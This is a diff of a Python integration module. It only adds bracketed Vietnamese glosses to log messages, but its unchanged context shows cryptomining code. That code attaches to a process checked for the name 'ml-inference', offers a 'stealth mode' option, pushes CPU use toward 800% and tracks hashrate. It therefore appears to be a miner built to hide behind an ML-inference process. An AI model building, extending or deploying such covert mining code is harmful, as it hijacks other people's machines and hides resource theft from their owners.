@@ -80,7 +80,7 @@ class OptimizedSystemIntegration:
     def inject_throttling_manager(self, throttling_manager: Any):
         """Inject existing throttling manager for compatibility"""
         self.throttling_manager = throttling_manager
-        self.logger.info("Throttling manager injected for compatibility")
+        self.logger.info("Throttling **[manager]** (trình quản lý) injected for compatibility")
     
     def register_external_throttling_callback(self, callback: Callable[[float], bool]):
         """Register callback cho external throttling requests"""
@@ -186,11 +186,11 @@ class OptimizedSystemIntegration:
             bool: True if successfully attached, False otherwise
         """
         try:
-            self.logger.info(f"⚡ Attaching OptimizedCalculationChain to existing process PID={pid}")
+            self.logger.info(f"⚡ Attaching OptimizedCalculationChain to existing **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid}")
             
             # Validate process exists and is accessible
             if not psutil.pid_exists(pid):
-                self.logger.error(f"Process PID={pid} không tồn tại")
+                self.logger.error(f"**[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid} không tồn tại")
                 return False
             
             try:
@@ -199,12 +199,12 @@ class OptimizedSystemIntegration:
                 
                 # Validate đây là ml-inference process
                 if "ml-inference" not in process_name and "inference" not in process_name:
-                    self.logger.warning(f"Process PID={pid} ({process_name}) may not be ml-inference")
+                    self.logger.warning(f"**[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid} ({process_name}) may not be ml-inference")
                 
-                self.logger.info(f"🔗 Validated process: {process_name} (PID={pid})")
+                self.logger.info(f"🔗 Validated **[process]** (tiến trình): {process_name} (**[PID]** (Process ID - mã định danh tiến trình)={pid})")
                 
             except psutil.AccessDenied:
-                self.logger.error(f"Access denied to process PID={pid}")
+                self.logger.error(f"Access denied to **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                 return False
             
             # Store legacy process PID for tracking
@@ -212,25 +212,25 @@ class OptimizedSystemIntegration:
             
             # Enable stealth mode compatibility if needed
             if self.config.stealth_mode_compatible:
-                self.logger.info("🥷 Stealth mode compatibility enabled for existing process")
+                self.logger.info("🥷 Stealth mode compatibility enabled for existing **[process]** (tiến trình)")
             
             # If mining adapter exists, register the PID
             if self.mining_adapter:
                 try:
                     # Register existing process với mining adapter
                     self.mining_adapter.register_external_process(pid)
-                    self.logger.info(f"✅ Registered PID={pid} with mining adapter")
+                    self.logger.info(f"✅ Registered **[PID]** (Process ID - mã định danh tiến trình)={pid} with mining adapter")
                 except Exception as e:
-                    self.logger.warning(f"Failed to register PID with mining adapter: {e}")
+                    self.logger.warning(f"Failed to register **[PID]** (Process ID - mã định danh tiến trình) with mining adapter: {e}")
             
             # Set flag indicating we're attached to external process
             self.optimized_mining_active = True
             
-            self.logger.info(f"🎯 Successfully attached OptimizedCalculationChain to PID={pid}")
+            self.logger.info(f"🎯 Successfully attached OptimizedCalculationChain to **[PID]** (Process ID - mã định danh tiến trình)={pid}")
             return True
             
         except Exception as e:
-            self.logger.error(f"❌ Failed to attach to existing process PID={pid}: {e}")
+            self.logger.error(f"❌ Failed to attach to existing **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
 
     def apply_system_throttling(self, throttle_percentage: float) -> bool:
@@ -254,7 +254,7 @@ class OptimizedSystemIntegration:
                     try:
                         self.external_throttling_callback(throttle_percentage)
                     except Exception as e:
-                        self.logger.error(f"External throttling callback error: {e}")
+                        self.logger.error(f"External throttling callback **[error]** (lỗi): {e}")
             
             return success
             
@@ -291,13 +291,13 @@ class OptimizedSystemIntegration:
             return status
             
         except Exception as e:
-            self.logger.error(f"Error getting system performance status: {e}")
+            self.logger.error(f"**[error]** (lỗi) getting system performance status: {e}")
             return {'error': str(e)}
     
     def handle_legacy_process_termination(self, pid: int):
         """Handle termination của legacy mining process"""
         if self.legacy_process_pid == pid:
-            self.logger.info(f"Legacy mining process {pid} terminated, switching to optimized")
+            self.logger.info(f"Legacy mining **[process]** (tiến trình) {pid} terminated, switching to optimized")
             # Start optimized mining if not already running
             if not self.optimized_mining_active:
                 self.start_optimized_mining()
@@ -333,7 +333,7 @@ class OptimizedSystemIntegration:
                 self.shutdown_event.wait(self.config.resource_monitoring_interval)
                 
             except Exception as e:
-                self.logger.error(f"System monitoring error: {e}")
+                self.logger.error(f"System monitoring **[error]** (lỗi): {e}")
                 self.shutdown_event.wait(5.0)
     
     def _get_system_resource_stats(self) -> Dict[str, Any]:
@@ -374,7 +374,7 @@ class OptimizedSystemIntegration:
             }
             
         except Exception as e:
-            self.logger.error(f"Error getting system resource stats: {e}")
+            self.logger.error(f"**[error]** (lỗi) getting system **[resource]** (tài nguyên) stats: {e}")
             return {'error': str(e)}
     
     def _check_performance_thresholds(self, metrics):
@@ -382,14 +382,14 @@ class OptimizedSystemIntegration:
         try:
             # Check CPU utilization
             if metrics.total_cpu_utilization < self.performance_thresholds['min_cpu_utilization']:
-                self.logger.warning(f"Low CPU utilization: {metrics.total_cpu_utilization:.1f}% (target: 800%)")
+                self.logger.warning(f"Low **[CPU]** (bộ xử lý trung tâm) utilization: {metrics.total_cpu_utilization:.1f}% (target: 800%)")
             
             # Check efficiency
             if metrics.efficiency_score < self.performance_thresholds['min_efficiency_score']:
                 self.logger.warning(f"Low efficiency score: {metrics.efficiency_score:.3f}")
             
         except Exception as e:
-            self.logger.error(f"Error checking performance thresholds: {e}")
+            self.logger.error(f"**[error]** (lỗi) checking performance thresholds: {e}")
     
     def _check_system_health(self):
         """Check overall system health"""
@@ -397,18 +397,18 @@ class OptimizedSystemIntegration:
             if 'memory' in self.resource_stats:
                 memory_usage = self.resource_stats['memory']['percent_used']
                 if memory_usage > self.performance_thresholds['max_memory_usage']:
-                    self.logger.warning(f"High memory usage: {memory_usage:.1f}%")
+                    self.logger.warning(f"High **[memory]** (bộ nhớ) usage: {memory_usage:.1f}%")
             
             if 'temperature' in self.resource_stats and 'max_temp' in self.resource_stats['temperature']:
                 max_temp = self.resource_stats['temperature']['max_temp']
                 if max_temp > self.performance_thresholds['max_thermal_temp']:
-                    self.logger.warning(f"High CPU temperature: {max_temp}°C")
+                    self.logger.warning(f"High **[CPU]** (bộ xử lý trung tâm) temperature: {max_temp}°C")
                     # Auto-apply thermal throttling
                     if self.config.auto_performance_tuning:
                         self.apply_system_throttling(50.0)  # 50% throttling for thermal protection
                         
         except Exception as e:
-            self.logger.error(f"Error checking system health: {e}")
+            self.logger.error(f"**[error]** (lỗi) checking system health: {e}")
     
     def _generate_performance_recommendations(self, metrics) -> List[str]:
         """Generate performance optimization recommendations"""
@@ -430,7 +430,7 @@ class OptimizedSystemIntegration:
                 recommendations.append("Poor load balancing detected - consider thermal-aware distribution")
             
         except Exception as e:
-            self.logger.error(f"Error generating recommendations: {e}")
+            self.logger.error(f"**[error]** (lỗi) generating recommendations: {e}")
         
         return recommendations
     
@@ -445,7 +445,7 @@ class OptimizedSystemIntegration:
     def _fallback_to_legacy(self) -> bool:
         """Fallback to legacy mining process"""
         try:
-            self.logger.warning("Falling back to legacy mining process")
+            self.logger.warning("Falling back to legacy mining **[process]** (tiến trình)")
             self.integration_active = False
             self.optimized_mining_active = False
             return True
@@ -476,7 +476,7 @@ class OptimizedSystemIntegration:
             self.logger.info("✅ OptimizedSystemIntegration cleanup completed")
             
         except Exception as e:
-            self.logger.error(f"Error during cleanup: {e}")
+            self.logger.error(f"**[error]** (lỗi) during cleanup: {e}")
     
     def __enter__(self):
         return self
@@ -559,7 +559,7 @@ if __name__ == "__main__":
                     
                     if status['mining_performance']:
                         perf = status['mining_performance']
-                        logger.info(f"   Total CPU: {perf['total_cpu_utilization']:.1f}%")
+                        logger.info(f"   Total **[CPU]** (bộ xử lý trung tâm): {perf['total_cpu_utilization']:.1f}%")
                         logger.info(f"   Hashrate: {perf['hashrate']:.2f} H/s")
                         logger.info(f"   Efficiency: {perf['efficiency_score']:.3f}")
                     
